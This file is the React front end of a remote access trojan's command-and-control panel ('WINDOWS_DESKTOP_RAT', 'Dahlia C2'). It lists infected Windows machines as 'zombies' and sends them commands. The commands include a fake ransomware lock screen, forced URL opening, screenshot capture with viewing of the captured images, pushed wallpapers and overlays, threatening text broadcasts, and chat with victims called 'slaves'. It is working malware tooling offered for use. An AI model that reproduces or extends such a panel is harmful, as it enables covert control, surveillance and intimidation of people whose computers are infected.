import { useState, useEffect } from 'react';
import { io, Socket } from 'socket.io-client';
import {
  Zap,
  Bell,
  Search,
  Send,
  Volume2,
  Activity,
  WifiOff,
  Terminal,
  ShieldOff,
  Camera,
  Layers
} from 'lucide-react';

const SOCKET_SERVER_URL = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' ? 'http://localhost:3000' : window.location.origin;

interface ConnectedClient {
  id: string;
  type: string;
  subName: string;
  connectedAt: number;
}

interface Notification {
  id: string;
  time: Date;
  message: string;
  type: 'info' | 'success' | 'warning' | 'image';
  url?: string;
}

interface ChatMessage {
  id: string;
  sourceId: string;
  subName: string;
  message: string;
  timestamp: number;
  fromAdmin: boolean;
}

function App() {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [clients, setClients] = useState<ConnectedClient[]>([]);
  const [broadcastMsg, setBroadcastMsg] = useState('');
  const [notifications, setNotifications] = useState<Notification[]>([]);
  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([]);
  const [chatInput, setChatInput] = useState('');
  const [selectedChatClient, setSelectedChatClient] = useState<string | 'GLOBAL'>('GLOBAL');

  useEffect(() => {
    // Connessione al C2 Server Node.js bypassing Localtunnel interstitial
    const newSocket = io(SOCKET_SERVER_URL, {
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      reconnectionAttempts: Infinity,
      transports: ['websocket', 'polling']
    });

    newSocket.on('connect', () => {
      console.log('Connected to C2 Server');
      // Mi registro come Admin
      newSocket.emit('register', { type: 'admin' });
      addNotification('System', 'Connected to Dahlia C2 Server', 'success');
    });

    newSocket.on('clients_update', (updatedClients: ConnectedClient[]) => {
      setClients(updatedClients);
    });

    newSocket.on('admin_notification', (data: any) => {
      if (data.type === 'new_image') {
        const fullUrl = `${SOCKET_SERVER_URL}${data.url}`;
        addNotification(`Image from ${data.sourceId}`, `Received new ${data.imageType}`, 'image', fullUrl);
      } else if (data.type === 'wheel_run') {
        addNotification(`WHEEL RESULT: ${data.subName || data.sourceId}`, `FATE DECIDED: "${data.fate}"`, 'warning');
        alert(`[!] DAHLIA ALERT [!]\n\nSlave ${data.subName || data.sourceId} spun the Wheel of Fate!\n\nRESULT: ${data.fate}`);
      } else {
        addNotification(`Sub ${data.subName || data.sourceId}`, data.message || JSON.stringify(data), 'info');
      }
    });

    newSocket.on('admin_chat_receive', (data: any) => {
      setChatMessages(prev => [...prev, {
        id: Math.random().toString(),
        sourceId: data.sourceId,
        subName: data.subName,
        message: data.message,
        timestamp: data.timestamp,
        fromAdmin: false
      }]);
    });

    newSocket.on('disconnect', () => {
      addNotification('System', 'Disconnected from server', 'warning');
    });

    setSocket(newSocket);
    return () => { newSocket.close(); };
  }, []);

  const addNotification = (title: string, message: string, type: 'info' | 'success' | 'warning' | 'image', url?: string) => {
    setNotifications(prev => [{
      id: Math.random().toString(36).substring(7),
      time: new Date(),
      message: `${title}: ${message}`,
      type,
      url
    }, ...prev].slice(0, 50));
  };

  const sendCommand = (targetId: string, cmd: string, payload: any = {}) => {
    if (!socket) return;
    socket.emit('admin_command', {
      targetId: targetId,
      command: cmd,
      payload: payload
    });
    addNotification('Command Sent', `${cmd} -> ${targetId}`, 'info');
  };

  const handleCustomImageUpload = async (file: File, type: 'wallpaper' | 'overlay' | 'spam_overlay', timeoutMs: number = 0) => {
    if (clients.length === 0) {
      alert("No active zombies to receive the image!");
      return;
    }

    const formData = new FormData();
    formData.append('file', file);
    formData.append('fromAdmin', 'true');
    formData.append('imageType', type);
    formData.append('timeoutMs', timeoutMs.toString());

    // Al momento applichiamo a tutti i client (Global Broadcast)
    // Se si volesse il singolo, basterebbe far scegliere il target string.
    clients.forEach(c => formData.append('subId', c.id));

    // E nel server prendiamo subId, se è array o stringa.
    // Modifichiamo per usare il primo client per semplicity per ora.
    // Per gestire n target l'ideale sarebbe farne N chiamate o iterare su server, 
    // lo facciamo iterando qui per ogni client:

    addNotification('System', `Uploading Custom ${type.toUpperCase()}...`, 'warning');

    for (const c of clients) {
      const clientFormData = new FormData();
      clientFormData.append('file', file);
      clientFormData.append('fromAdmin', 'true');
      clientFormData.append('imageType', type);
      clientFormData.append('timeoutMs', timeoutMs.toString());
      clientFormData.append('subId', c.id);

      try {
        const res = await fetch(`${SOCKET_SERVER_URL}/api/upload`, {
          method: 'POST',
          body: clientFormData
        });
        const data = await res.json();
        if (!data.success) throw new Error("Upload Failed");
      } catch (e) {
        console.error(e);
        addNotification('Error', `Upload failed for ${c.subName}`, 'warning');
      }
    }
  };

  return (
    <div className="min-h-screen relative p-4 lg:p-8 font-mono overflow-x-hidden text-gray-200">
      {/* CRT Scanline Effect Overlay */}
      <div className="crt-overlay"></div>
      <div className="scanline"></div>

      <div className="max-w-7xl mx-auto relative z-10">

        {/* Header Cyberpunk */}
        <header className="flex flex-col md:flex-row items-center justify-between mb-8 cyber-panel p-6 rounded-lg">
          <div className="flex items-center space-x-4 mb-4 md:mb-0">
            <div className="p-3 bg-dark-900 border border-primary-500 rounded-lg shadow-[0_0_15px_rgba(0,255,65,0.3)]">
              <Terminal className="w-10 h-10 text-primary-500" />
            </div>
            <div>
              <h1 className="text-3xl font-bold text-primary-500 tracking-wider glitch-text mb-1 flex items-center">
                WINDOWS_DESKTOP_RAT<span className="text-secondary-500 ml-2">_V1</span>
              </h1>
              <p className="text-xs text-gray-400 font-bold uppercase tracking-widest">
                <span className="text-primary-500 animate-pulse mr-2">●</span> SECURE C2 CONNECTION ESTABLISHED (PC ONLY)
              </p>
            </div>
          </div>

          <div className="flex items-center space-x-6">
            <div className="text-right">
              <p className="text-sm text-gray-500 uppercase tracking-widest mb-1">NETWORK_STATUS</p>
              <div className="flex items-center justify-end space-x-2">
                <div className={`w-3 h-3 rounded-full ${clients.length > 0 ? 'bg-primary-500 animate-pulse shadow-[0_0_10px_rgba(0,255,65,0.8)]' : 'bg-danger-500 shadow-[0_0_10px_rgba(255,0,60,0.8)]'}`}></div>
                <span className={`font-bold ${clients.length > 0 ? 'text-primary-500' : 'text-danger-500'}`}>
                  {clients.length} PC_ZOMBIES_ONLINE
                </span>
              </div>
            </div>
          </div>
        </header>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">

          {/* Colonna Sinistra: Lista Target */}
          <div className="lg:col-span-1 space-y-6">
            <div className="cyber-panel rounded-lg overflow-hidden border-t-2 border-t-secondary-500">
              <div className="p-4 border-b border-gray-800 bg-black/40 flex items-center justify-between">
                <h2 className="text-lg font-bold text-secondary-500 flex items-center tracking-widest">
                  <Activity className="w-5 h-5 mr-2" /> WINDOWS_NODES
                </h2>
                <span className="text-xs bg-dark-900 text-secondary-500 px-2 py-1 rounded border border-secondary-500/30">
                  {clients.length}
                </span>
              </div>
              <div className="p-4">
                {clients.length === 0 ? (
                  <div className="text-center py-10 text-gray-600 border border-dashed border-gray-800 rounded-lg">
                    <WifiOff className="w-12 h-12 mx-auto mb-3 opacity-50" />
                    <p className="font-bold uppercase tracking-widest">AWAITING_EXECUTABLES</p>
                    <p className="text-xs mt-2 font-mono break-all">{SOCKET_SERVER_URL}</p>
                  </div>
                ) : (
                  <div className="space-y-3">
                    {clients.map(client => (
                      <div key={client.id} className="p-4 rounded-lg bg-dark-900 border border-primary-500/30 hover:border-primary-500 transition-colors cursor-pointer group relative overflow-hidden">
                        <div className="absolute top-0 left-0 w-1 h-full bg-primary-500 opacity-50 group-hover:opacity-100 transition-opacity"></div>
                        <div className="flex justify-between items-start ml-2">
                          <div className="overflow-hidden">
                            <p className="font-bold text-lg text-white group-hover:text-primary-500 transition-colors truncate">
                              {client.subName}
                            </p>
                            <p className="text-xs text-gray-500 font-mono mt-1 flex items-center">
                              <span className="text-secondary-500 mr-1">ID:</span> {client.id.substring(0, 8)}...
                            </p>
                          </div>
                          <span className="shrink-0 ml-2 px-2 py-1 bg-primary-500/10 text-primary-500 text-[10px] rounded uppercase font-bold border border-primary-500/50">
                            ONLINE
                          </span>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Colonna Destra: Comandi & Log */}
          <div className="lg:col-span-2 space-y-6">

            {/* Pannello Comandi RAT Attivi */}
            <div className={`cyber-panel rounded-lg overflow-hidden border-t-2 border-t-primary-500 transition-opacity duration-300 ${clients.length === 0 ? 'opacity-30 pointer-events-none' : ''}`}>
              <div className="p-4 border-b border-gray-800 bg-black/40">
                <h2 className="text-lg font-bold text-primary-500 flex items-center tracking-widest uppercase">
                  <Terminal className="w-5 h-5 mr-2" /> WINDOWS_ROOT_TERMINAL
                </h2>
              </div>

              <div className="p-6">
                <p className="text-xs text-secondary-500 mb-6 font-bold uppercase tracking-widest border-l-2 border-secondary-500 pl-3">
                  // GLOBAL_BROADCAST: EXECUTE ON ALL ACTIVE WINDOWS PC
                </p>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">

                  {/* Nuovi Comandi Molesti e Interattivi */}
                  <div className="bg-dark-900 border border-gray-800 rounded-lg p-4 relative overflow-hidden group hover:border-danger-500/50 transition-colors">
                    <h3 className="text-sm font-bold text-gray-400 mb-3 uppercase tracking-widest flex items-center">
                      <Volume2 className="w-4 h-4 mr-2 text-danger-500" /> Windows Core Attacks
                    </h3>
                    <div className="space-y-3">
                      <button
                        onClick={() => clients.forEach(c => sendCommand(c.id, 'trigger_fake_app_overlay'))}
                        className="w-full bg-red-900/40 border border-red-500 text-red-500 hover:bg-red-500 hover:text-white px-4 py-3 rounded text-sm font-bold flex items-center justify-center transition-all shadow-[0_0_10px_rgba(255,0,0,0.1)] hover:shadow-[0_0_20px_rgba(255,0,0,0.4)] uppercase tracking-wider"
                      >
                        <ShieldOff className="w-4 h-4 mr-2 animate-pulse" /> RANSOMWARE LOCK SCREEN
                      </button>

                      <button
                        onClick={() => {
                          const url = prompt("Enter Target URL to open on the PC's Default Browser:", "https://throne.com/");
                          if (url) {
                            clients.forEach(c => sendCommand(c.id, 'open_url', { url: url }));
                          }
                        }}
                        className="w-full border border-secondary-500 text-secondary-500 hover:bg-secondary-500 hover:text-white px-4 py-3 rounded text-sm font-bold flex items-center justify-center transition-all shadow-[0_0_10px_rgba(139,0,255,0.1)] hover:shadow-[0_0_20px_rgba(139,0,255,0.4)] uppercase tracking-wider"
                      >
                        <Search className="w-4 h-4 mr-2" /> FORCE PC BROWSING
                      </button>

                      {/* --- COMANDI ESTREMI --- */}
                      <div className="flex gap-2">
                        <button
                          onClick={() => clients.forEach(c => sendCommand(c.id, 'play_sound'))}
                          className="flex-1 bg-gray-800 hover:bg-gray-700 text-gray-400 border border-gray-600 px-3 py-2 rounded text-xs font-bold flex items-center justify-center transition-all"
                        >
                          <Volume2 className="w-3 h-3 mr-1" /> PLAY NOTIFY SOUND
                        </button>
                        <button
                          onClick={() => clients.forEach(c => sendCommand(c.id, 'dismiss_overlay'))}
                          className="flex-1 bg-purple-900/40 hover:bg-purple-800/60 text-purple-400 border border-purple-700/50 px-3 py-2 rounded text-xs font-bold flex items-center justify-center transition-all shadow-[0_0_15px_rgba(128,0,128,0.2)]"
                        >
                          <Bell className="w-3 h-3 mr-1" /> DISMISS OVERLAYS
                        </button>
                      </div>

                      <div className="flex gap-2 mt-2">
                        <button
                          onClick={() => clients.forEach(c => sendCommand(c.id, 'screenshot'))}
                          className="flex-1 border border-indigo-500 text-indigo-500 hover:bg-indigo-500 hover:text-white px-3 py-3 rounded text-xs font-bold flex items-center justify-center transition-all uppercase"
                        >
                          <Camera className="w-4 h-4 mr-2" /> PC SCREENSHOT
                        </button>
                      </div>

                      {/* --- CUSTOM IMAGE UPLOADS (WALLPAPER E OVERLAYS) --- */}
                      <div className="pt-3 mt-3 border-t border-gray-800">
                        <h4 className="text-xs text-secondary-500 mb-2 font-bold uppercase tracking-wider">Custom Payload Images</h4>
                        <div className="flex flex-col gap-2">
                          <div className="flex items-center gap-2">
                            <label className="flex-1 cursor-pointer bg-dark-900 border border-secondary-500 text-secondary-500 hover:bg-secondary-500 hover:text-white px-2 py-2 rounded text-xs font-bold flex items-center justify-center transition-all overflow-hidden relative">
                              <Search className="w-3 h-3 mr-1" />
                              <span className="truncate">SET WALLPAPER</span>
                              <input
                                type="file"
                                accept="image/*"
                                className="hidden"
                                onChange={(e) => {
                                  if (e.target.files && e.target.files.length > 0) {
                                    handleCustomImageUpload(e.target.files[0], 'wallpaper');
                                  }
                                }}
                              />
                            </label>

                            <label className="flex-1 cursor-pointer bg-dark-900 border border-danger-500 text-danger-500 hover:bg-danger-500 hover:text-white px-2 py-2 rounded text-xs font-bold flex items-center justify-center transition-all overflow-hidden relative">
                              <Layers className="w-3 h-3 mr-1" />
                              <span className="truncate">CUSTOM OVERLAY</span>
                              <input
                                type="file"
                                accept="image/*"
                                className="hidden"
                                onChange={(e) => {
                                  if (e.target.files && e.target.files.length > 0) {
                                    const timeoutInput = prompt("Enter timeout in milliseconds (0 for infinite):", "5000");
                                    if (timeoutInput !== null) {
                                      const timeoutMs = parseInt(timeoutInput, 10);
                                      handleCustomImageUpload(e.target.files[0], 'overlay', isNaN(timeoutMs) ? 0 : timeoutMs);
                                    }
                                  }
                                }}
                              />
                            </label>
                          </div>
                        </div>
                      </div>

                    </div>
                  </div>

                  {/* Overlay Testo Legacy*/}
                  <div className="bg-dark-900 border border-gray-700 hover:border-gray-500 transition-colors rounded-lg p-5">
                    <h3 className="text-sm font-bold text-gray-400 mb-3 uppercase tracking-widest flex items-center">
                      <Terminal className="w-4 h-4 mr-2" /> TEXT OVERLAY
                    </h3>
                    <div className="flex flex-col gap-4">
                      <input
                        type="text"
                        value={broadcastMsg}
                        onChange={(e) => setBroadcastMsg(e.target.value)}
                        placeholder="INSERISCI TESTO MINACCIA..."
                        className="w-full bg-black border border-gray-700 rounded-lg px-4 py-3 text-white focus:outline-none focus:border-gray-500 font-mono tracking-wider text-sm transition-colors placeholder-gray-700"
                      />
                      <button
                        onClick={() => {
                          clients.forEach(c => sendCommand(c.id, 'overlay', { text: broadcastMsg }));
                          addNotification('System', `Global broadcast: ${broadcastMsg}`, 'info');
                          setBroadcastMsg('');
                        }}
                        disabled={!broadcastMsg}
                        className="w-full border border-gray-600 text-gray-300 hover:bg-gray-800 px-6 py-3 rounded-lg font-bold flex items-center justify-center disabled:opacity-50 disabled:cursor-not-allowed uppercase tracking-wider transition-colors"
                      >
                        <Send className="w-4 h-4 mr-2" /> BROADCAST TXT
                      </button>
                    </div>
                  </div>
                </div>

                {/* --- LIVE DIRECT COMMS CHAT BOX --- */}
                <div className="mt-6 bg-dark-900 border border-primary-500 rounded-lg p-4 flex flex-col shadow-[0_0_15px_rgba(0,255,65,0.1)] h-64">
                  <div className="flex justify-between items-center mb-2">
                    <h3 className="text-sm font-bold text-primary-500 uppercase tracking-widest flex items-center">
                      <Terminal className="w-4 h-4 mr-2" /> LIVE DAHLIA CHAT
                    </h3>
                    <select
                      value={selectedChatClient}
                      onChange={(e) => setSelectedChatClient(e.target.value)}
                      className="bg-black border border-primary-500 text-primary-500 text-xs py-1 px-2 rounded focus:outline-none focus:ring-1 focus:ring-primary-500"
                    >
                      <option value="GLOBAL">GLOBAL BROADCAST</option>
                      {clients.map(c => (
                        <option key={c.id} value={c.id}>{c.subName} ({c.id.substring(0, 4)})</option>
                      ))}
                    </select>
                  </div>

                  <div className="flex-1 bg-black border border-gray-800 rounded p-3 overflow-y-auto mb-3 font-mono text-xs">
                    {chatMessages.filter(msg => selectedChatClient === 'GLOBAL' || msg.sourceId === selectedChatClient || msg.sourceId === 'admin').length === 0 ? (
                      <p className="text-gray-600 italic">No comms for selected target...</p>
                    ) : (
                      chatMessages.filter(msg => selectedChatClient === 'GLOBAL' || msg.sourceId === selectedChatClient || msg.sourceId === 'admin').map(msg => (
                        <div key={msg.id} className={`mb-2 ${msg.fromAdmin ? 'text-primary-500 text-right' : 'text-gray-300 text-left'}`}>
                          <span className="font-bold opacity-50 mr-2">[{new Date(msg.timestamp).toLocaleTimeString()}]</span>
                          <span className="font-bold">{msg.fromAdmin ? 'MASTER' : msg.subName}:</span> {msg.message}
                        </div>
                      ))
                    )}
                  </div>
                  <div className="flex gap-2">
                    <input
                      type="text"
                      value={chatInput}
                      onChange={(e) => setChatInput(e.target.value)}
                      onKeyDown={(e) => {
                        if (e.key === 'Enter' && chatInput && socket) {
                          const newMsg: ChatMessage = {
                            id: Math.random().toString(),
                            sourceId: 'admin',
                            subName: 'MASTER',
                            message: chatInput,
                            timestamp: Date.now(),
                            fromAdmin: true
                          };
                          setChatMessages(prev => [...prev, newMsg]);

                          if (selectedChatClient === 'GLOBAL') {
                            clients.forEach(c => socket.emit('chat_message', { targetId: c.id, message: chatInput, fromAdmin: true }));
                          } else {
                            socket.emit('chat_message', { targetId: selectedChatClient, message: chatInput, fromAdmin: true });
                          }
                          setChatInput('');
                        }
                      }}
                      placeholder={`TYPE TO ${selectedChatClient === 'GLOBAL' ? 'ALL SUBS' : 'SELECTED SUB'}...`}
                      className="flex-1 bg-black border border-primary-500/50 rounded px-3 py-2 text-primary-500 focus:outline-none focus:border-primary-500 font-mono text-xs"
                    />
                    <button
                      onClick={() => {
                        if (chatInput && socket) {
                          const newMsg: ChatMessage = {
                            id: Math.random().toString(),
                            sourceId: 'admin',
                            subName: 'MASTER',
                            message: chatInput,
                            timestamp: Date.now(),
                            fromAdmin: true
                          };
                          setChatMessages(prev => [...prev, newMsg]);

                          if (selectedChatClient === 'GLOBAL') {
                            clients.forEach(c => socket.emit('chat_message', { targetId: c.id, message: chatInput, fromAdmin: true }));
                          } else {
                            socket.emit('chat_message', { targetId: selectedChatClient, message: chatInput, fromAdmin: true });
                          }
                          setChatInput('');
                        }
                      }}
                      className="bg-primary-500/20 hover:bg-primary-500 text-primary-500 hover:text-black border border-primary-500 px-4 rounded font-bold text-xs transition-colors"
                    >
                      SEND
                    </button>
                  </div>
                </div>

              </div>
            </div>

            {/* Terminal Log Console */}
            <div className="cyber-panel rounded-lg overflow-hidden h-96 flex flex-col border border-gray-800" id="notifs">
              <div className="p-3 border-b border-gray-800 bg-black/50 flex justify-between items-center">
                <h2 className="text-sm font-bold text-gray-400 flex items-center tracking-widest uppercase">
                  <Terminal className="w-4 h-4 mr-2 text-primary-500" /> SYSTEM.LOGS_STREAM
                </h2>
                <div className="flex space-x-2">
                  <div className="w-3 h-3 rounded-full bg-red-500 opacity-50"></div>
                  <div className="w-3 h-3 rounded-full bg-yellow-500 opacity-50"></div>
                  <div className="w-3 h-3 rounded-full bg-green-500 opacity-50 animate-pulse"></div>
                </div>
              </div>
              <div className="flex-1 p-4 overflow-y-auto font-mono text-sm bg-black/80">
                {notifications.length === 0 ? (
                  <p className="text-gray-600 italic animate-pulse">Waiting for events...</p>
                ) : (
                  <div className="space-y-4">
                    {notifications.map(notif => (
                      <div key={notif.id} className={`flex flex-col border-l-2 pl-3 py-1 ${notif.type === 'success' ? 'border-primary-500 text-primary-500/90' :
                        notif.type === 'image' ? 'border-secondary-500 text-secondary-500' :
                          notif.type === 'warning' ? 'border-yellow-500 text-yellow-500/90' :
                            'border-gray-500 text-gray-400'
                        }`}>
                        <div className="flex items-start">
                          <span className="text-gray-600 text-xs mr-3 mt-1 shrink-0 whitespace-nowrap">
                            [{notif.time ? notif.time.toLocaleTimeString() : new Date().toLocaleTimeString()}]
                          </span>
                          <div>
                            <span className="font-bold tracking-wider">{notif.type.toUpperCase()}</span>
                            <span className="mx-2 opacity-50">_</span>
                            <span className="break-all">{notif.message}</span>
                          </div>
                        </div>
                        {notif.type === 'image' && notif.url && (
                          <div className="mt-3 relative inline-block group">
                            <div className="absolute -inset-1 bg-gradient-to-r from-secondary-500 to-primary-500 rounded-lg blur opacity-25 group-hover:opacity-75 transition duration-200"></div>
                            <img
                              src={`${notif.url?.startsWith('http') ? notif.url : SOCKET_SERVER_URL + (notif.url || '')}`}
                              alt="Captured"
                              className="max-h-64 rounded border border-gray-700 cursor-pointer relative z-10 hover:border-secondary-500 transition-colors"
                              onClick={() => setSelectedImage(`${notif.url?.startsWith('http') ? notif.url : SOCKET_SERVER_URL + (notif.url || '')}`)}
                            />
                          </div>
                        )}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Modal Visualizzatore Immagini Cyber */}
      {selectedImage && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/95 backdrop-blur-sm" onClick={() => setSelectedImage(null)}>
          <div className="crt-overlay"></div>
          <div className="relative max-w-5xl w-full cyber-panel p-2 rounded-xl" onClick={e => e.stopPropagation()}>
            <button
              onClick={() => setSelectedImage(null)}
              className="absolute -top-4 -right-4 p-2 bg-danger-500 text-white rounded-full hover:bg-white hover:text-danger-500 transition-colors z-10 shadow-[0_0_15px_rgba(255,0,60,0.8)] border border-danger-500"
            >
              <Zap className="w-5 h-5 font-bold" />
            </button>
            <div className="absolute top-4 left-4 bg-black/80 px-3 py-1 rounded text-primary-500 font-mono text-xs border border-primary-500 tracking-widest z-10 shadow-[0_0_10px_rgba(0,255,65,0.4)]">
              DATALINK_DECRYPTED
            </div>
            <img src={selectedImage} alt="Expanded" className="w-full h-auto max-h-[85vh] object-contain rounded-lg filter drop-shadow-[0_0_20px_rgba(0,255,65,0.2)]" />
          </div>
        </div>
      )}
    </div>
  );
}

export default App;
